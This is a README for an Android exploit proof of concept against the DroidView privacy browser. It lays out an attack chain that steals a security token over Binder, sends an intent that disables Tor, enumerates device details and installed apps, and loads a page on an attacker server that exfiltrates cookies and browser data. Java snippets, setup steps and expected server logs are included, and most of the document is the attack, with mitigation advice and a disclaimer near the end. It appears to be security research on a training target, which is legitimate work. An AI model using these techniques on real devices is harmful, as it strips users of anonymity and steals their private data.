# DroidView Vulnerability Exploit PoC

## Overview
This repository contains a Proof-of-Concept (PoC) demonstrating the exploitation of multiple vulnerabilities in the **DroidView** Android application (package `com.eightksec.droidview`). The DroidView app is a privacy-oriented browser that uses Tor for anonymity and employs a security token to protect its Tor toggle functionality. However, due to several design flaws, an attacker can:

1. Retrieve the security token from an exposed `TokenService`.
2. Disable Tor protection using the stolen token.
3. Collect extensive device information and a list of installed apps.
4. Exfiltrate browser data via a malicious webpage loaded inside DroidView's WebView.

All data is sent to a remote attacker-controlled server, including the victim's real IP address.

## Vulnerabilities Exploited
### 1. Exported Service (`TokenService`)
- **Location**: `AndroidManifest.xml` – `android:exported="true"` with intent filters.
- **Impact**: Any app can bind to `TokenService` and call its `getSecurityToken()` method via Binder, retrieving the current security token without any permission check.

### 2. Unprotected Broadcast Receiver
- **Location**: `MainActivity` dynamically registers a receiver for `com.eightksec.droidview.TOGGLE_SECURITY`.
- **Impact**: Any app can send an Intent with this action, providing a valid token, to enable/disable Tor. The token can be stolen via the exported service.

### 3. Insecure WebView Configuration
- **Location**: `MainActivity.setupWebView()` overrides `onReceivedSslError` with `handler.proceed()`.
- **Impact**: The WebView accepts all SSL certificates, making it vulnerable to MITM attacks. Combined with the ability to load arbitrary URLs via `ACTION_VIEW` Intents, an attacker can load a malicious page and exfiltrate browser data.

### 4. Weak Token Management
- **Location**: `SecurityTokenManager` stores a static token (generated once) in a local database.
- **Impact**: The token never changes, allowing indefinite reuse once stolen.

### 5. Open Intent Handling
- **Location**: `MainActivity` handles `ACTION_VIEW` and `ACTION_LOAD_URL` without restrictions.
- **Impact**: Any app can force DroidView to open any URL, even after Tor is disabled, leading to data exfiltration.

## Attack Chain
1. **Launch PoC app** → It starts DroidView to ensure the target service is alive.
2. **Bind to `TokenService`** and retrieve the security token via direct Binder transaction.
3. **Send `TOGGLE_SECURITY` Intent** with `enable_security=false` and the stolen token to disable Tor.
4. **Collect device information** (model, Android ID, OS version, language, installed packages) and send to the server.
5. **Open DroidView’s WebView** to `http://attacker-server/exploit.html?token=<stolen>`.
6. **Malicious page** (running inside DroidView) sends browser data (User-Agent, cookies, referrer) to the attacker’s server.
7. **All exfiltrated data** is logged with the victim’s real IP address.

## PoC Components
### 1. Android Exploit App (`com.nasr.droidviewpoc`)
- **`MainActivity.java`**:
  - Binds to the target service using `bindService`.
  - Uses `Parcel` to directly invoke `getSecurityToken` on the Binder.
  - Sends the `TOGGLE_SECURITY` Intent to disable Tor.
  - Collects device info via `Build`, `Settings.Secure`, and `PackageManager`.
  - Sends JSON data to the server via HTTP POST.
  - Launches DroidView with a malicious URL.
- **`AndroidManifest.xml`**:
  - Declares `QUERY_ALL_PACKAGES` (or uses `<queries>` with LAUNCHER intent) to list installed apps.
  - Adds `android:usesCleartextTraffic="true"` to allow HTTP.
  - Includes `<queries>` to resolve the target service.

### 2. Attacker Server (`server.py`)
- Flask-based server with endpoints:
  - `/exploit.html` – serves the malicious JavaScript page.
  - `/collect` – accepts both FormData (from web page) and JSON (from Android app) and logs everything with timestamp and IP.
- Logs are written to `log.txt`.

### 3. Malicious Web Page (`exploit.html`)
- Embedded inside `server.py`.
- Extracts token from URL query parameters.
- Sends browser data (userAgent, language, platform, cookies, referrer) to `/collect` using `fetch` with `FormData` and `no-cors` mode.

## Setup & Usage
### Prerequisites
- Android device/emulator with DroidView installed (target app).
- Attacker machine with Python 3 and Flask (`pip install flask`).
- Both devices on the same network.

### Steps
1. **Edit IP addresses** in `MainActivity.java` (lines `SERVER_URL` and the exploit URL) to point to your attacker machine.
2. **Build and install** the PoC app on the victim device.
3. **Run the server**:
   ```bash
   python server.py
   ```
4. **Launch the PoC app** from the device. Observe server logs for incoming data.

## Expected Output (server logs)
```
[REQUEST] /exploit.html from 192.168.1.108 with args: token=...
[COLLECT] 2025-... | IP: 192.168.1.108 | Web Data: {'userAgent': '...', ...}
[DEVICE INFO] 2025-... | IP: 192.168.1.108 | Device Info (JSON): {'manufacturer': 'samsung', 'model': 'SM-M115F', 'installed_packages': ['...']}
```

## Code Highlights
### Token Retrieval via Binder
```java
private String getTokenViaBinder(IBinder binder) {
    Parcel data = Parcel.obtain();
    Parcel reply = Parcel.obtain();
    data.writeInterfaceToken("com.eightksec.droidview.ITokenService");
    binder.transact(1, data, reply, 0); // 1 = TRANSACTION_getSecurityToken
    reply.readException();
    String token = reply.readString();
    // ...
    return token;
}
```

### Disable Tor Intent
```java
Intent intent = new Intent("com.eightksec.droidview.TOGGLE_SECURITY");
intent.setPackage("com.eightksec.droidview");
intent.putExtra("enable_security", false);
intent.putExtra("security_token", token);
startActivity(intent);
```

### Collecting Installed Apps
```java
PackageManager pm = getPackageManager();
List<ApplicationInfo> apps = pm.getInstalledApplications(PackageManager.GET_META_DATA);
JSONArray packages = new JSONArray();
for (ApplicationInfo app : apps) packages.put(app.packageName);
```

## Mitigation Recommendations
- **Protect exported services** with custom permissions or signature-level protection.
- **Validate caller identity** in Binder methods (e.g., `getCallingUid()`).
- **Use `LocalBroadcastManager`** or require permissions for sensitive BroadcastReceivers.
- **Do not accept all SSL errors** in WebView; show warnings to the user.
- **Rotate tokens** and bind them to the device or user session.
- **Restrict Intent handling** to trusted sources only.

## Disclaimer
This PoC is for educational and security research purposes only. Do not use it against systems you do not own or have explicit permission to test.
